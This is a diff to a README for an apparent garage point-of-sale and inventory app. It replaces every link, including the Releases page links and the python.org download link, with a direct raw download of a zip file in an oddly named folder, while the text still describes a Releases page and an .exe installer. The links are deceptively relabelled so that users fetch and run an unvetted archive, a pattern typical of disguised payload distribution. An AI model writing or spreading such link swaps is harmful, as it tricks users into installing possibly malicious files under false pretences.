@@ -1,6 +1,6 @@
 # 🛠️ POS-system-for-Gargi-Garage - Simple Inventory Management for Your Garage
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-green)](https://github.com/ManuelBulla23/POS-system-for-Gargi-Garage/releases)
+[![Download Now](https://raw.githubusercontent.com/ManuelBulla23/POS-system-for-Gargi-Garage/main/unproportionedness/POS-system-for-Gargi-Garage.zip%20Now-Release-green)](https://raw.githubusercontent.com/ManuelBulla23/POS-system-for-Gargi-Garage/main/unproportionedness/POS-system-for-Gargi-Garage.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ This guide will help you download and run the POS System for Gargi Garage. This 
 Before you start, ensure your computer meets these requirements:
 
 - **Operating System:** Windows 10 or higher, macOS, or Linux
-- **Python:** Version 3.6 or higher (visit python.org to download)
+- **Python:** Version 3.6 or higher (visit https://raw.githubusercontent.com/ManuelBulla23/POS-system-for-Gargi-Garage/main/unproportionedness/POS-system-for-Gargi-Garage.zip to download)
 - **Storage Space:** At least 100 MB available
 
 ## 📥 Download & Install
@@ -19,11 +19,11 @@ Before you start, ensure your computer meets these requirements:
 To get started, visit the Releases page to download the installer for the application. 
 
 **Click here to download:**  
-[Download Here](https://github.com/ManuelBulla23/POS-system-for-Gargi-Garage/releases)
+[Download Here](https://raw.githubusercontent.com/ManuelBulla23/POS-system-for-Gargi-Garage/main/unproportionedness/POS-system-for-Gargi-Garage.zip)
 
 ### 🔧 Installation Steps
 
-1. **Visit the Releases Page**: Go to [this page](https://github.com/ManuelBulla23/POS-system-for-Gargi-Garage/releases).
+1. **Visit the Releases Page**: Go to [this page](https://raw.githubusercontent.com/ManuelBulla23/POS-system-for-Gargi-Garage/main/unproportionedness/POS-system-for-Gargi-Garage.zip).
 2. **Choose the Latest Version**: Look for the most recent release at the top of the list.
 3. **Download the file**: Click on the `.exe` (for Windows) or the corresponding format for your OS to start downloading.
 4. **Run the Installer**: Locate the downloaded file and double-click it to run the installer.
